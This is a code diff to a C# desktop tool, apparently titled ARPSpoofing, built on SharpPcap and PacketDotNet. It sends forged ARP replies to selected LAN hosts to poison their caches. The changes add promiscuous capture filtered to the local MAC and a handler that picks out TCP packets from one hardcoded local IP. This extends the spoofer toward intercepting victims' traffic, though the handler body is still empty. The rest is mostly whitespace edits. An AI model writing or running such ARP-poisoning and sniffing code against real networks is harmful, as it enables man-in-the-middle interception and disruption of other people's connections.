@@ -1,6 +1,7 @@
 ﻿using CommunityToolkit.Mvvm.ComponentModel;
 using CommunityToolkit.Mvvm.Input;
 using PacketDotNet;
+using PacketDotNet.Ieee80211;
 using SharpPcap;
 using SharpPcap.LibPcap;
 using System;
@@ -249,6 +250,32 @@ namespace ARPSpoofing
             StartIpAddress = GatewayIp.ToString();
             EndIpAddress = GatewayIp.ToString();
             GatewayMac = Resolve(GatewayIp);
+
+            if (GatewayMac != null)
+            {
+                LibPcapLiveDevice.OnPacketArrival +=
+                            new PacketArrivalEventHandler(OnPacketArrival);
+            }
+        }
+
+        private void OnPacketArrival(object sender, PacketCapture e)
+        {
+            var packet = TcpPacket.ParsePacket(e.Device.LinkType, e.Data.ToArray());
+            if (packet != null) 
+            {
+                TcpPacket tcpPacket = packet.Extract<TcpPacket>();
+                if (tcpPacket != null) 
+                {
+                    var ipPacket = (IPPacket)tcpPacket.ParentPacket;
+                    if (ipPacket != null) 
+                    {
+                        if (ipPacket.SourceAddress.ToString() == "192.168.21.178") 
+                        {
+
+                        }
+                    }
+                }
+            }
         }
 
         /// <summary>
@@ -404,6 +431,7 @@ namespace ARPSpoofing
 
                         if (LibPcapLiveDevice.GetNextPacket(out var packet) > 0)
                         {
+
                             if (packet.Device.LinkType != LinkLayers.Ethernet)
                             {
                                 continue;
@@ -414,7 +442,6 @@ namespace ARPSpoofing
                             {
                                 continue;
                             }
-
                             //回复的arp包并且是我们请求的ip地址
                             if (arpPacket.SenderProtocolAddress.Equals(targetIPList[i]))
                             {
@@ -459,7 +486,11 @@ namespace ARPSpoofing
 
             IsAttacking = true;
             if (!LibPcapLiveDevice.Opened)
+            {
+                
                 LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
+                LibPcapLiveDevice.Filter = "ether dst " + LocalMac.ToString();
+            }
             foreach (var compute in target)
             {
                 var packet = BuildResponse(IPAddress.Parse(compute.IPAddress), PhysicalAddress.Parse(compute.MacAddress), GatewayIp, LocalMac);
@@ -480,7 +511,7 @@ namespace ARPSpoofing
                         try
                         {
                             LibPcapLiveDevice.SendPacket(packet);
-                            if (!attackComputer.Succeed) 
+                            if (!attackComputer.Succeed)
                             {
                                 attackComputer.Succeed = true;
                             }
@@ -507,10 +538,10 @@ namespace ARPSpoofing
         /// <summary>
         /// 停止攻击主机
         /// </summary>
-        private void StopCallTargetComputer() 
+        private void StopCallTargetComputer()
         {
             var targets = ArpAttackComputers.Where(x => x.IsSelected).ToList();
-            foreach (var item in targets) 
+            foreach (var item in targets)
             {
                 item.CancelTask();
                 ArpAttackComputers.Remove(item);
@@ -585,7 +616,7 @@ namespace ARPSpoofing
             CancellationTokenSource = new CancellationTokenSource();
             Task.Run(async () =>
             {
-                while (true) 
+                while (true)
                 {
                     if (Succeed)
                     {
@@ -604,12 +635,12 @@ namespace ARPSpoofing
         /// <summary>
         /// 发送arp诈骗
         /// </summary>
-        internal void SendArpSpoofing() 
+        internal void SendArpSpoofing()
         {
             ArpAttackTask?.Start();
         }
 
-        internal void CancelTask() 
+        internal void CancelTask()
         {
             CancellationTokenSource?.Cancel();
         }
